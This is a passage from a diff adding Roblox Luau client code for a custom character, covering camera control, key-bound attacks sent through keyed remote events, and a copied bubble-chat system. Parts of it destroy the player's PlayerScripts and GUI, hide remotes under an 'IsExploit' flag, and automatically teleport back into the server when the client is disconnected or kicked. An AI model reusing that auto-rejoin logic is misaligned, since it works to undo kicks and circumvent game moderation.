+						if v:FindFirstAncestorOfClass("ScreenGui") then
+							v:FindFirstAncestorOfClass("ScreenGui"):Destroy()
+						else
+							v:Destroy()
+						end
+					end
+				end)
+			end]]
+			end)
+			game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
+			local function AttributeToCFrame(Position, Orientation)
+				return CFrame.new(Position)*CFrame.Angles(Orientation.X, Orientation.Y, Orientation.Z)
+			end
+			local Ignoring,Effects,RayProperties,Remotes,CameraPosition,Throttle,ConsecutiveFrames,Frame,RemoteName,Trottle,RemoteKey,Mouse,WorldModels,CameraRotation,CameraZoom,CameraCFrame,Character,ToReplace,Received = true,{},RaycastParams.new(),{},Vector3.new(),0,0,1/60,script:GetAttribute("RemoteName"),1,script:GetAttribute("RemoteKey"),game:GetService("Players").LocalPlayer:GetMouse(),{},Vector2.new(0,-15),15,CFrame.new()
+			RayProperties.FilterType = Enum.RaycastFilterType.Blacklist
+			local function FireServer(...)
+				for _,v in pairs(Remotes) do
+					v:FireServer(RemoteKey, ...)
+				end
+			end
+			local Protected
+			local function ConnectEvent(Event_)
+				table.insert(Remotes,Event_)
+				local EventConnect = Event_.OnClientEvent:Connect(function(Method, Things)
+					if type(Method) == "string" and type(Things) == "table" then
+						if Method == "SetCharacter" then
+							Character, CameraPosition, Protected = Things.Character, Things.CameraPosition.Position, Things.Protected
+							local RayCharacter = {}
+							for _,v in pairs(Character) do
+								if v:IsA("BasePart") then
+									table.insert(RayCharacter,v)
+								end
+							end
+							for _,v in pairs(Effects) do
+								table.insert(RayCharacter,v)
+							end
+							RayProperties.FilterDescendantsInstances = RayCharacter
+						elseif Method == "Received" then
+							Received = true
+						elseif Method == "Effects" then
+							for _,v in pairs(Things) do
+								table.insert(Effects,v)
+								local Removed
+								Removed = v.AncestryChanged:Connect(function()
+									if not v:IsDescendantOf(workspace) then
+										table.remove(Effects,table.find(Effects,v))
+										Removed:Disconnect()
+									end
+								end)
+							end
+						elseif Method == "Notification" then
+							game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{Text = "​[The Ascentionist​]​:​ ​"..Things.Text,Font = 43,Color = Color3.new(.5,.5,.5),FontSize = 2})
+						end
+					end
+				end)
+				local EventRemoval
+				EventRemoval = Event_.AncestryChanged:Connect(function()
+					if not Event_:IsDescendantOf(game) then
+						table.remove(Remotes,table.find(Remotes,Event_))
+						EventConnect:Disconnect()
+						EventRemoval:Disconnect()
+					end
+				end)
+			end
+			game.DescendantAdded:Connect(function(v)
+				if table.pack(pcall(game.IsA,v,"RemoteEvent"))[2] == true and v:GetAttribute("RemoteName")==RemoteName then
+					ConnectEvent(v)
+				end
+			end)
+			do
+				local InstanceCount = 0
+				for _,v in pairs(game:GetDescendants()) do
+					if table.pack(pcall(game.IsA,v,"RemoteEvent"))[2] == true and v:GetAttribute("RemoteName")==RemoteName then
+						ConnectEvent(v)
+					end
+					InstanceCount += 1
+					if InstanceCount >= 1e3 then
+						game:GetService("RunService").RenderStepped:Wait()
+						InstanceCount = 0
+					end
+				end
+			end
+			function KeyDown(Key)
+				return (not Ignoring or not game:GetService("UserInputService"):GetFocusedTextBox()) and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode[Key]) or false
+			end
+			game:GetService("UserInputService").InputBegan:Connect(function(Input,Ignore)
+				if Input.UserInputType == Enum.UserInputType.Keyboard then
+					local Key = string.sub(tostring(Input.KeyCode), 14)
+					if Key == "F1" then
+						Ignoring = not Ignoring
+					end
+					if Ignore and Ignoring then
+						return
+					end 
+					if Key == "F" then
+						Movement.Flying=not Movement.Flying
+					elseif Key == "Q" then
+						FireServer("ReplaceCharacter", {})
+					elseif Key == "X" then
+						FireServer("Attack", {Type = "SkySmash"})
+					elseif Key == "I" then
+						if CameraInfo.Zoom > 1 then
+							CameraInfo.Zoom = CameraInfo.Zoom*.8
+						else
+							CameraInfo.Zoom = 0
+						end
+					elseif Key == "O" then
+						if CameraInfo.Zoom >= 1 then
+							CameraInfo.Zoom = CameraInfo.Zoom*1.25
+						else
+							CameraInfo.Zoom = 1
+						end
+					elseif Key == "P" then
+						FireServer("ResetPosition", {})
+					elseif Key=="B" then
+						if Movement.Emote then return; end
+						Movement.Emote=true
+						Moving.Event:Wait()
+						Movement.Emote=false
+					end
+				elseif Input.UserInputType == Enum.UserInputType.MouseButton1 then
+					if Ignore and Ignoring then
+						return
+					end
+					FireServer("Attack", {Type = "ClickAttack"})
+					task.wait(3)
+				elseif Input.UserInputType == Enum.UserInputType.MouseWheel then
+					if Ignore and Ignoring then
+						return
+					end 
+					if Input.Position.Z > 0 then
+						if CameraInfo.Zoom > 1 then
+							CameraInfo.Zoom = CameraInfo.Zoom*.8
+						else
+							CameraInfo.Zoom = 0
+						end
+					else
+						if CameraInfo.Zoom >= 1 then
+							CameraInfo.Zoom = CameraInfo.Zoom*1.25
+						else
+							CameraInfo.Zoom = 1
+						end
+					end
+				end
+			end)
+			game:GetService("UserInputService").InputChanged:Connect(function(Input,Ignore)
+				if Input.UserInputType == Enum.UserInputType.MouseWheel then
+					if Ignore and Ignoring then
+						return
+					end 
+					if Input.Position.Z > 0 then
+						if CameraInfo.Zoom > 1 then
+							CameraInfo.Zoom = CameraInfo.Zoom*.8
+						else
+							CameraInfo.Zoom = 0
+						end
+					else
+						if CameraInfo.Zoom >= 1 then
+							CameraInfo.Zoom = CameraInfo.Zoom*1.25
+						else
+							CameraInfo.Zoom = 1
+						end
+					end
+				end
+			end)
+			if not game:GetService("RunService"):IsStudio() then
+				game:GetService("NetworkClient").ChildRemoved:Connect(function(v)
+					if v.ClassName == "ClientReplicator" then
+						game:GetService("TeleportService"):SetTeleportGui(Instance.new("ScreenGui"))
+						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+						game:GetService("TeleportService").TeleportInitFailed:Connect(function(Player,Result)
+							local Result = Result.Value
+							if Player ~= game:GetService("Players").LocalPlayer then
+								return
+							end
+							if Result >= 2 and Result <= 5 then
+								game:GetService("TeleportService"):Teleport(game.PlaceId)
+							else
+								local Start = tick()
+								repeat
+									game:GetService("RunService").RenderStepped:Wait()
+								until tick()-Start >= 5
+								game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+							end
+						end)
+					end
+				end)
+			end
+			function Vector(X, Y, Z)
+				if not Z then
+					return Vector2.new(tonumber(X), tonumber(Y))
+				else
+					return Vector3.new(tonumber(X), tonumber(Y), tonumber(Z))
+				end
+			end
+			local function RandomString(Length)
+				local Returned = table.pack(pcall(function()
+					return string.gsub(string.rep(" ",ValidNumber(Length) and math.clamp(Length,1,1e4) or math.random(5,100)),".",function(x)
+						return string.char(({math.random(48,57),math.random(65,90),math.random(97,122)})[math.random(1,3)])
+					end)
+				end))
+				table.remove(Returned,1)
+				return unpack(Returned)
+			end
+			game:GetService("UserInputService"):GetPropertyChangedSignal("MouseBehavior"):Connect(function()
+				local MouseBehavior = game:GetService("UserInputService").MouseBehavior.Value
+				if CameraInfo.Zoom == 0 then
+					game:GetService("UserInputService").MouseBehavior = 1
+				elseif game:GetService("UserInputService"):IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
+					game:GetService("UserInputService").MouseBehavior = 2
+				else
+					game:GetService("UserInputService").MouseBehavior = 0
+				end
+			end)
+			game:GetService("UserInputService"):GetPropertyChangedSignal("MouseDeltaSensitivity"):Connect(function()
+				if game:GetService("UserInputService").MouseDeltaSensitivity ~= 1 then
+					game:GetService("UserInputService").MouseDeltaSensitivity = 1
+				end
+			end)
+			local controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls()
+			controls:Disable()
+			local GunCF=CFrame.new(0, 0, 0)
+			CameraInfo={CFrame=workspace.CurrentCamera.CFrame, Rotation=Vector2.new(0, 0), ActualRotation=Vector2.new(0, 0), ActualZoom=Vector2.new(90, 0), Zoom=90}
+			game:GetService("RunService").RenderStepped:Connect(function(Frames)
+				if IsExploit then
+					for _, v in pairs(Remotes) do
+						pcall(function()
+							v.Parent=RobloxReplicatedStorage
+						end)
+					end
+				end
+				ConsecutiveFrames += Frames
+				Throttle = 0
+				for _ = 1,ConsecutiveFrames/Frame do
+					ConsecutiveFrames -= Frame
+					Throttle += 1
+				end
+				if not workspace.CurrentCamera or workspace.CurrentCamera.CameraType ~= Enum.CameraType.Scriptable or math.floor(workspace.CurrentCamera.FieldOfView*10+0.5)/10 ~= 70 or workspace.CurrentCamera.CFrame ~= CameraInfo.CFrame then
+					DDD(workspace.CurrentCamera)
+					Camera, Removed = Instance.new("Camera")
+					Camera.Name = RandomString()
+					Removed = Camera.AncestryChanged:Connect(function()
+						if Camera.Parent ~= workspace then
+							DDD(Camera)
+							Removed:Disconnect()
+						end
+					end)
+					Camera.Parent = workspace
+					workspace.CurrentCamera = Camera
+				end
+				workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+				workspace.CurrentCamera.FieldOfView = 70
+				local MouseDelta = game:GetService("UserInputService"):GetMouseDelta()*(UserSettings():GetService("UserGameSettings").MouseSensitivity/2)
+				if CameraInfo.Zoom == 0 then
+					game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.LockCenter
+					CameraInfo.Rotation-=Vector2.new(MouseDelta.X, MouseDelta.Y)
+				elseif game:GetService("UserInputService"):IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
+					game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
+					CameraInfo.Rotation-=Vector2.new(MouseDelta.X, MouseDelta.Y)
+				else
+					game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
+				end
+				if KeyDown("Left") then
+					CameraInfo.Rotation += Vector2.new(2.5*Throttle, 0)
+				end
+				if KeyDown("Right") then
+					CameraInfo.Rotation -= Vector2.new(2.5*Throttle, 0)
+				end
+				if KeyDown("Up") then
+					CameraInfo.Rotation += Vector2.new(0, 2.5*Throttle)
+				end
+				if KeyDown("Down") then
+					CameraInfo.Rotation -= Vector2.new(0, 2.5*Throttle)
+				end
+				CameraInfo.Rotation = Vector2.new(CameraInfo.Rotation.X, CameraInfo.Rotation.Y)
+				local NewAngles = CFrame.Angles(math.rad(0), math.rad(CameraInfo.ActualRotation.X), math.rad(0))*CFrame.Angles(math.rad(CameraInfo.ActualRotation.Y), math.rad(0), math.rad(0))
+				CameraInfo.Angles=NewAngles
+				CameraInfo.CFrame = NewAngles+(getfenv().Movement.CFrame*CFrame.new(0, 1.5, 0)).Position+NewAngles*Vector(0, 0, CameraInfo.ActualZoom.X)
+				workspace.CurrentCamera.CFrame=CameraInfo.CFrame
+				workspace.CurrentCamera.Focus=CameraInfo.CFrame*CFrame.new(0, 0, -CameraInfo.ActualZoom)
+				if CameraInfo.Zoom == 0 then
+					if Character then
+						for _,v in pairs(Character) do
+							if typeof(v) == "Instance" then
+								if v:IsA("BasePart") then
+									v.Transparency = 1
+								end
+							end
+						end
+					end
+				else
+					if Character then
+						for _,v in pairs(Character) do
+							if typeof(v) == "Instance" then
+								if v:IsA("BasePart") then
+									v.Transparency = 0
+								end
+							end
+						end
+					end
+				end
+				local UnitRay = workspace.CurrentCamera:ScreenPointToRay(Mouse.X, Mouse.Y)
+				local Rays={}
+				Insert(Rays, Raycast(UnitRay.Origin, UnitRay.Direction*1e3))
+				local Ray_=GetClosest(UnitRay.Origin, Rays)
+				CameraInfo.ActualRotation, CameraInfo.ActualZoom=Clerp(CameraInfo.ActualRotation, CameraInfo.Rotation, 0.2), Clerp(CameraInfo.ActualZoom, Vector(CameraInfo.Zoom, 0), 0.2)
+				FireServer("Movement", {Movement=getfenv().Movement, CFrame=CameraInfo.CFrame, Rotation = CameraInfo.ActualRotation, Angles = NewAngles,Zoom = CameraInfo.Zoom,W = KeyDown("W"),A = KeyDown("A"),S = KeyDown("S"),D = KeyDown("D"), GunHole=Gun.CFrame, Hit = Ray_ and CFrame.new(Ray_.Position) or CFrame.new(UnitRay.Origin,UnitRay.Origin+UnitRay.Direction)*CFrame.new(0,0,-1e3)})
+			end)
+			pcall(coroutine.wrap(function()
+				Resume(function()
+					local PlayersService = game:GetService('Players')
+					local ReplicatedStorage = game:GetService("ReplicatedStorage")
+					local ChatService = game:GetService("Chat")
+					local TextService = game:GetService("TextService")
+					--[[ END OF SERVICES ]]
+					DDD(Players.LocalPlayer:FindFirstChildOfClass("PlayerScripts"))
+
+					Players.LocalPlayer.PlayerGui:ClearAllChildren()
+					local LocalPlayer=Players.LocalPlayer
+
+					local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+					local success, UserShouldLocalizeGameChatBubble = pcall(function()
+						return UserSettings():IsUserFeatureEnabled("UserShouldLocalizeGameChatBubble")
+					end)
+					local UserShouldLocalizeGameChatBubble = success and UserShouldLocalizeGameChatBubble
+
+					local UserFixBubbleChatText do
+						local success, value = pcall(function()
+							return UserSettings():IsUserFeatureEnabled("UserFixBubbleChatText")
+						end)
+						UserFixBubbleChatText = success and value
+					end
+
+					local UserRoactBubbleChatBeta do
+						local success, value = pcall(function()
+							return UserSettings():IsUserFeatureEnabled("UserRoactBubbleChatBeta")
+						end)
+						UserRoactBubbleChatBeta = success and value
+					end
+
+					local UserPreventOldBubbleChatOverlap do
+						local success, value = pcall(function()
+							return UserSettings():IsUserFeatureEnabled("UserPreventOldBubbleChatOverlap")
+						end)
+						UserPreventOldBubbleChatOverlap = success and value
+					end
+
+					local function getMessageLength(message)
+						return utf8.len(utf8.nfcnormalize(message))
+					end
+
+					--[[ SCRIPT VARIABLES ]]
+					local CHAT_BUBBLE_FONT = Enum.Font.SourceSans
+					local CHAT_BUBBLE_FONT_SIZE = Enum.FontSize.Size24 -- if you change CHAT_BUBBLE_FONT_SIZE_INT please change this to match
+					local CHAT_BUBBLE_FONT_SIZE_INT = 24 -- if you change CHAT_BUBBLE_FONT_SIZE please change this to match
+					local CHAT_BUBBLE_LINE_HEIGHT = CHAT_BUBBLE_FONT_SIZE_INT + 10
+					local CHAT_BUBBLE_TAIL_HEIGHT = 14
+					local CHAT_BUBBLE_WIDTH_PADDING = 30
+					local CHAT_BUBBLE_PADDING = 12
+					local CHAT_BUBBLE_FADE_SPEED = 1.5
+
+					local BILLBOARD_MAX_WIDTH = 400
+					local BILLBOARD_MAX_HEIGHT = 250	--This limits the number of bubble chats that you see above characters
+
+					local ELIPSES = "..."
+					local MaxChatMessageLength = 128 -- max chat message length, including null terminator and elipses.
+					local MaxChatMessageLengthExclusive = MaxChatMessageLength - getMessageLength(ELIPSES) - 1
+
+					local NEAR_BUBBLE_DISTANCE = 65	--previously 45
+					local MAX_BUBBLE_DISTANCE = 100	--previously 80
+
+					--[[ END OF SCRIPT VARIABLES ]]
+
+
+					-- [[ SCRIPT ENUMS ]]
+					local BubbleColor = {	WHITE = "dub",
+						BLUE = "blu",
+						GREEN = "gre",
+						RED = "red" }
+
+					--[[ END OF SCRIPT ENUMS ]]
+
+					-- This screenGui exists so that the billboardGui is not deleted when the PlayerGui is reset.
+					local BubbleChatScreenGui = Instance.new("ScreenGui")
+					BubbleChatScreenGui.Name = "BubbleChat"
+					BubbleChatScreenGui.ResetOnSpawn = false
+					BubbleChatScreenGui.Parent = PlayerGui
+
+					--[[ FUNCTIONS ]]
+
+					local function lerpLength(msg, min, max)
+						return min + (max - min) * math.min(getMessageLength(msg) / 75.0, 1.0)
+					end
+
+					local function createFifo()
+						local this = {}
+						this.data = {}
+
+						local emptyEvent = Instance.new("BindableEvent")
+						this.Emptied = emptyEvent.Event
+
+						function this:Size()
+							return #this.data
+						end
+
+						function this:Empty()
+							return this:Size() <= 0
+						end
+
+						function this:PopFront()
+							table.remove(this.data, 1)
+							if this:Empty() then emptyEvent:Fire() end
+						end
+
+						function this:Front()
+							return this.data[1]
+						end
+
+						function this:Get(index)
+							return this.data[index]
+						end
+
+						function this:PushBack(value)
+							table.insert(this.data, value)
+						end
+
+						function this:GetData()
+							return this.data
+						end
+
+						return this
+					end
+
+					local function createCharacterChats()
+						local this = {}
+
+						this.Fifo = createFifo()
+						this.BillboardGui = nil
+
+						return this
+					end
+
+					local function createMap()
+						local this = {}
+						this.data = {}
+						local count = 0
+
+						function this:Size()
+							return count
+						end
+
+						function this:Erase(key)
+							if this.data[key] then count = count - 1 end
+							this.data[key] = nil
+						end
+
+						function this:Set(key, value)
+							this.data[key] = value
+							if value then count = count + 1 end
+						end
+
+						function this:Get(key)
+							if not key then return end
+							if not this.data[key] then
+								this.data[key] = createCharacterChats()
+								local emptiedCon = nil
+								emptiedCon = this.data[key].Fifo.Emptied:connect(function()
+									emptiedCon:disconnect()
+									this:Erase(key)
+								end)
+							end
+							return this.data[key]
+						end
+
+						function this:GetData()
+							return this.data
+						end
+
+						return this
+					end
+
+					local function createChatLine(message, bubbleColor, isLocalPlayer)
+						local this = {}
+
+						function this:ComputeBubbleLifetime(msg, isSelf)
+							if isSelf then
+								return lerpLength(msg, 8, 15)
+							else
+								return lerpLength(msg, 12, 20)
+							end
+						end
+
+						this.Origin = nil
+						this.RenderBubble = nil
+						this.Message = message
+						this.BubbleDieDelay = this:ComputeBubbleLifetime(message, isLocalPlayer)
+						this.BubbleColor = bubbleColor
+						this.IsLocalPlayer = isLocalPlayer
+
+						return this
+					end
+
+					local function createPlayerChatLine(player, message, isLocalPlayer)
+						local this = createChatLine(message, BubbleColor.WHITE, isLocalPlayer)
+
+						if player then
+							this.User = player.Name
+							this.Origin = player.Character
+						end
+
+						return this
+					end
+
+					local function createGameChatLine(origin, message, isLocalPlayer, bubbleColor)
+						local this = createChatLine(message, bubbleColor, isLocalPlayer)
+						this.Origin = origin
+
+						return this
+					end
+
+					function createChatBubbleMain(filePrefix, sliceRect)
+						local chatBubbleMain = Instance.new("ImageLabel")
+						chatBubbleMain.Name = "ChatBubble"
+						chatBubbleMain.ScaleType = Enum.ScaleType.Slice
+						chatBubbleMain.SliceCenter = sliceRect
+						chatBubbleMain.Image = "rbxasset://textures/" .. tostring(filePrefix) .. ".png"
+						chatBubbleMain.BackgroundTransparency = 1
+						chatBubbleMain.BorderSizePixel = 0
+						chatBubbleMain.Size = UDim2.new(1.0, 0, 1.0, 0)
+						chatBubbleMain.Position = UDim2.new(0, 0, 0, 0)
+
+						return chatBubbleMain
+					end
+
+					function createChatBubbleTail(position, size)
+						local chatBubbleTail = Instance.new("ImageLabel")
+						chatBubbleTail.Name = "ChatBubbleTail"
+						chatBubbleTail.Image = "rbxasset://textures/ui/dialog_tail.png"
+						chatBubbleTail.BackgroundTransparency = 1
+						chatBubbleTail.BorderSizePixel = 0
+						chatBubbleTail.Position = position
+						chatBubbleTail.Size = size
+
+						return chatBubbleTail
+					end
+
+					function createChatBubbleWithTail(filePrefix, position, size, sliceRect)
+						local chatBubbleMain = createChatBubbleMain(filePrefix, sliceRect)
+
+						local chatBubbleTail = createChatBubbleTail(position, size)
+						chatBubbleTail.Parent = chatBubbleMain
+
+						return chatBubbleMain
+					end
+
+					function createScaledChatBubbleWithTail(filePrefix, frameScaleSize, position, sliceRect)
+						local chatBubbleMain = createChatBubbleMain(filePrefix, sliceRect)
+
+						local frame = Instance.new("Frame")
+						frame.Name = "ChatBubbleTailFrame"
+						frame.BackgroundTransparency = 1
+						frame.SizeConstraint = Enum.SizeConstraint.RelativeXX
+						frame.Position = UDim2.new(0.5, 0, 1, 0)
+						frame.Size = UDim2.new(frameScaleSize, 0, frameScaleSize, 0)
+						frame.Parent = chatBubbleMain
+
+						local chatBubbleTail = createChatBubbleTail(position, UDim2.new(1, 0, 0.5, 0))
+						chatBubbleTail.Parent = frame
+
+						return chatBubbleMain
+					end
+
+					function createChatImposter(filePrefix, dotDotDot, yOffset)
+						local result = Instance.new("ImageLabel")
+						result.Name = "DialogPlaceholder"
+						result.Image = "rbxasset://textures/" .. tostring(filePrefix) .. ".png"
+						result.BackgroundTransparency = 1
+						result.BorderSizePixel = 0
+						result.Position = UDim2.new(0, 0, -1.25, 0)
+						result.Size = UDim2.new(1, 0, 1, 0)
+
+						local image = Instance.new("ImageLabel")
+						image.Name = "DotDotDot"
+						image.Image = "rbxasset://textures/" .. tostring(dotDotDot) .. ".png"
+						image.BackgroundTransparency = 1
+						image.BorderSizePixel = 0
+						image.Position = UDim2.new(0.001, 0, yOffset, 0)
+						image.Size = UDim2.new(1, 0, 0.7, 0)
+						image.Parent = result
+
+						return result
+					end
+
+
+					local this = {}
+					this.ChatBubble = {}
+					this.ChatBubbleWithTail = {}
+					this.ScalingChatBubbleWithTail = {}
+					this.CharacterSortedMsg = createMap()
+
+					-- init chat bubble tables
+					local function initChatBubbleType(chatBubbleType, fileName, imposterFileName, isInset, sliceRect)
+						this.ChatBubble[chatBubbleType] = createChatBubbleMain(fileName, sliceRect)
+						this.ChatBubbleWithTail[chatBubbleType] = createChatBubbleWithTail(fileName, UDim2.new(0.5, -CHAT_BUBBLE_TAIL_HEIGHT, 1, isInset and -1 or 0), UDim2.new(0, 30, 0, CHAT_BUBBLE_TAIL_HEIGHT), sliceRect)
+						this.ScalingChatBubbleWithTail[chatBubbleType] = createScaledChatBubbleWithTail(fileName, 0.5, UDim2.new(-0.5, 0, 0, isInset and -1 or 0), sliceRect)
+					end
+
+					initChatBubbleType(BubbleColor.WHITE,	"ui/dialog_white",	"ui/chatBubble_white_notify_bkg", 	false,	Rect.new(5,5,15,15))
+					initChatBubbleType(BubbleColor.BLUE,	"ui/dialog_blue",	"ui/chatBubble_blue_notify_bkg",	true, 	Rect.new(7,7,33,33))
+					initChatBubbleType(BubbleColor.RED,		"ui/dialog_red",	"ui/chatBubble_red_notify_bkg",		true,	Rect.new(7,7,33,33))
+					initChatBubbleType(BubbleColor.GREEN,	"ui/dialog_green",	"ui/chatBubble_green_notify_bkg",	true,	Rect.new(7,7,33,33))
+
+					function this:SanitizeChatLine(msg)
+						if getMessageLength(msg) > MaxChatMessageLengthExclusive then
+							local byteOffset = utf8.offset(msg, MaxChatMessageLengthExclusive + getMessageLength(ELIPSES) + 1) - 1
+							return string.sub(msg, 1, byteOffset)
+						else
+							return msg
+						end
+					end
+
+					local function createBillboardInstance(adornee)
+						local billboardGui = Instance.new("BillboardGui")
+						billboardGui.Adornee = adornee
+						billboardGui.Size = UDim2.new(0, BILLBOARD_MAX_WIDTH, 0, BILLBOARD_MAX_HEIGHT)
+						billboardGui.StudsOffset = Vector3.new(0, 1.5, 2)
+						billboardGui.Parent = BubbleChatScreenGui
+
+						local billboardFrame = Instance.new("Frame")
+						billboardFrame.Name = "BillboardFrame"
+						billboardFrame.Size = UDim2.new(1, 0, 1, 0)
+						billboardFrame.Position = UDim2.new(0, 0, -0.5, 0)
+						billboardFrame.BackgroundTransparency = 1
+						billboardFrame.Parent = billboardGui
+
+						local billboardChildRemovedCon = nil
+						billboardChildRemovedCon = billboardFrame.ChildRemoved:connect(function()
+							if #billboardFrame:GetChildren() <= 1 then
+								billboardChildRemovedCon:disconnect()
+								billboardGui:Destroy()
+							end
+						end)
+
+						this:CreateSmallTalkBubble(BubbleColor.WHITE).Parent = billboardFrame
+
+						return billboardGui
+					end
+
+					function this:CreateBillboardGuiHelper(instance, onlyCharacter)
+						if instance and not this.CharacterSortedMsg:Get(instance)["BillboardGui"] then
+							if not onlyCharacter then
+								if instance:IsA("BasePart") then
+									-- Create a new billboardGui object attached to this player
+									local billboardGui = createBillboardInstance(instance)
+									this.CharacterSortedMsg:Get(instance)["BillboardGui"] = billboardGui
+									return
+								end
+							end
+
+							if instance:IsA("Model") then
+								local head = instance:FindFirstChild("Head")
+								if head and head:IsA("BasePart") then
+									-- Create a new billboardGui object attached to this player
+									local billboardGui = createBillboardInstance(head)
+									this.CharacterSortedMsg:Get(instance)["BillboardGui"] = billboardGui
+								end
+							end
+						end
+					end
+
+					local function distanceToBubbleOrigin(origin)
+						if not origin then return 100000 end
+
+						return (origin.Position - (workspace.CurrentCamera).CoordinateFrame.Position).Magnitude
+					end
+
+					local function isPartOfLocalPlayer(adornee)
+						if adornee and PlayersService.LocalPlayer.Character then
+							return adornee:IsDescendantOf(PlayersService.LocalPlayer.Character)
+						end
+					end
+
+					function this:SetBillboardLODNear(billboardGui)
+						local isLocalPlayer = isPartOfLocalPlayer(billboardGui.Adornee)
+						billboardGui.Size = UDim2.new(0, BILLBOARD_MAX_WIDTH, 0, BILLBOARD_MAX_HEIGHT)
+						billboardGui.StudsOffset = Vector3.new(0, isLocalPlayer and 1.5 or 2.5, isLocalPlayer and 2 or 0.1)
+						billboardGui.Enabled = true
+						local billChildren = billboardGui.BillboardFrame:GetChildren()
+						for i = 1, #billChildren do
+							billChildren[i].Visible = true
+						end
+						billboardGui.BillboardFrame.SmallTalkBubble.Visible = false
+					end
+
+					function this:SetBillboardLODDistant(billboardGui)
+						local isLocalPlayer = isPartOfLocalPlayer(billboardGui.Adornee)
+						billboardGui.Size = UDim2.new(4, 0, 3, 0)
+						billboardGui.StudsOffset = Vector3.new(0, 3, isLocalPlayer and 2 or 0.1)
+						billboardGui.Enabled = true
+						local billChildren = billboardGui.BillboardFrame:GetChildren()
+						for i = 1, #billChildren do
+							billChildren[i].Visible = false
+						end
+						billboardGui.BillboardFrame.SmallTalkBubble.Visible = true
+					end
+
+					function this:SetBillboardLODVeryFar(billboardGui)
+						billboardGui.Enabled = false
+					end
+
+					function this:SetBillboardGuiLOD(billboardGui, origin)
+						if not origin then return end
+
+						if origin:IsA("Model") then
+							local head = origin:FindFirstChild("Head")
+							if not head then origin = origin.PrimaryPart
+							else origin = head end
+						end
+
+						local bubbleDistance = distanceToBubbleOrigin(origin)
+
+						if bubbleDistance < NEAR_BUBBLE_DISTANCE then
+							this:SetBillboardLODNear(billboardGui)
+						elseif bubbleDistance >= NEAR_BUBBLE_DISTANCE and bubbleDistance < MAX_BUBBLE_DISTANCE then
+							this:SetBillboardLODDistant(billboardGui)
+						else
+							this:SetBillboardLODVeryFar(billboardGui)
+						end
+					end
+
+					function this:CameraCFrameChanged()
+						for index, value in pairs(this.CharacterSortedMsg:GetData()) do
+							local playerBillboardGui = value["BillboardGui"]
+							if playerBillboardGui then this:SetBillboardGuiLOD(playerBillboardGui, index) end
+						end
+					end
+
+					function this:CreateBubbleText(message, shouldAutoLocalize)
+						local bubbleText = Instance.new("TextLabel")
+						bubbleText.Name = "BubbleText"
+						bubbleText.BackgroundTransparency = 1
+
+						if UserFixBubbleChatText then
+							bubbleText.Size = UDim2.fromScale(1, 1)
+						else
+							bubbleText.Position = UDim2.new(0, CHAT_BUBBLE_WIDTH_PADDING / 2, 0, 0)
+							bubbleText.Size = UDim2.new(1, -CHAT_BUBBLE_WIDTH_PADDING, 1, 0)
+						end
+
+						bubbleText.Font = CHAT_BUBBLE_FONT
+						bubbleText.ClipsDescendants = true
+						bubbleText.TextWrapped = true
+						bubbleText.FontSize = CHAT_BUBBLE_FONT_SIZE
+						bubbleText.Text = message
+						bubbleText.Visible = false
+						bubbleText.AutoLocalize = shouldAutoLocalize
+
+						if UserFixBubbleChatText then
+							local padding = Instance.new("UIPadding")
+							padding.PaddingTop = UDim.new(0, CHAT_BUBBLE_PADDING)
+							padding.PaddingRight = UDim.new(0, CHAT_BUBBLE_PADDING)
+							padding.PaddingBottom = UDim.new(0, CHAT_BUBBLE_PADDING)
+							padding.PaddingLeft = UDim.new(0, CHAT_BUBBLE_PADDING)
+							padding.Parent = bubbleText
+						end
+
+						return bubbleText
+					end
+
+					function this:CreateSmallTalkBubble(chatBubbleType)
+						local smallTalkBubble = this.ScalingChatBubbleWithTail[chatBubbleType]:Clone()
+						smallTalkBubble.Name = "SmallTalkBubble"
+						smallTalkBubble.AnchorPoint = Vector2.new(0, 0.5)
+						smallTalkBubble.Position = UDim2.new(0, 0, 0.5, 0)
+						smallTalkBubble.Visible = false
+						local text = this:CreateBubbleText("...")
+						text.TextScaled = true
+						text.TextWrapped = false
+						text.Visible = true
+						text.Parent = smallTalkBubble
+
+						return smallTalkBubble
+					end
+
+					function this:UpdateChatLinesForOrigin(origin, currentBubbleYPos)
+						local bubbleQueue = this.CharacterSortedMsg:Get(origin).Fifo
+						local bubbleQueueSize = bubbleQueue:Size()
+						local bubbleQueueData = bubbleQueue:GetData()
+						if #bubbleQueueData <= 1 then return end
+
+						for index = (#bubbleQueueData - 1), 1, -1 do
+							local value = bubbleQueueData[index]
+							local bubble = value.RenderBubble
+							if not bubble then return end
+							local bubblePos = bubbleQueueSize - index + 1
+
+							if bubblePos > 1 then
+								local tail = bubble:FindFirstChild("ChatBubbleTail")
+								if tail then tail:Destroy() end
+								local bubbleText = bubble:FindFirstChild("BubbleText")
+								if bubbleText then bubbleText.TextTransparency = 0.5 end
+							end
+
+							local udimValue = UDim2.new( bubble.Position.X.Scale, bubble.Position.X.Offset,
+								1, currentBubbleYPos - bubble.Size.Y.Offset - CHAT_BUBBLE_TAIL_HEIGHT)
+							bubble:TweenPosition(udimValue, Enum.EasingDirection.Out, Enum.EasingStyle.Bounce, 0.1, true)
+							currentBubbleYPos = currentBubbleYPos - bubble.Size.Y.Offset - CHAT_BUBBLE_TAIL_HEIGHT
+						end
+					end
+
+					function this:DestroyBubble(bubbleQueue, bubbleToDestroy)
+						if not bubbleQueue then return end
+						if bubbleQueue:Empty() then return end
+
+						local bubble = bubbleQueue:Front().RenderBubble
+						if not bubble then
+							bubbleQueue:PopFront()
+							return
+						end
+
+						spawn(function()
+							while bubbleQueue:Front().RenderBubble ~= bubbleToDestroy do
+								wait()
+							end
+
+							bubble = bubbleQueue:Front().RenderBubble
+
+							local timeBetween = 0
+							local bubbleText = bubble:FindFirstChild("BubbleText")
+							local bubbleTail = bubble:FindFirstChild("ChatBubbleTail")
+
+							while bubble and bubble.ImageTransparency < 1 do
+								timeBetween = wait()
+								if bubble then
